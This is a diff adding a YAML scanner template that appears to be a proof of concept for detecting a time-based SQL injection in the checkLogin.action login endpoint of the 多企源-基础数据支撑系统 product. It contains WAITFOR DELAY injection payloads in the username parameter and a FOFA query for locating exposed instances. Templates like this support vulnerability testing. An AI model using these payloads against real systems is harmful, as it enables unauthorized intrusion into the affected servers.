@@ -1,0 +1,26 @@
+id: poc-yaml-duoqio-checkLogin-sqli
+info:
+  name: 多企源-基础数据支撑系统 checkLogin SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 多企源-基础数据支撑系统
+  fofa: app="多企源-基础数据支撑系统"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 4
+  t3: random_int(1,3)
+  t4: t3 + 4
+requests:
+- method: POST
+  path: /json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  output:
+  - set_var("duration1",str(duration))
+  expression: "status_code == 200 && \ncontains(find_json(body,\"jsonDataBean.result\"\
+    ), \"用户名或密码不正确\") &&\nduration >= t1 &&\nduration <= t2\n"
+- method: POST
+  path: /json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:{{.t3}}%27--
+  expression: "int(regex_find(duration1,`^\\d+`)) - duration >= 2 &&\nstatus_code\
+    \ == 200 && \ncontains(find_json(body,\"jsonDataBean.result\"), \"用户名或密码不正确\"\
+    ) && \nduration >= t3 &&\nduration <= t4\n"
+transport: http
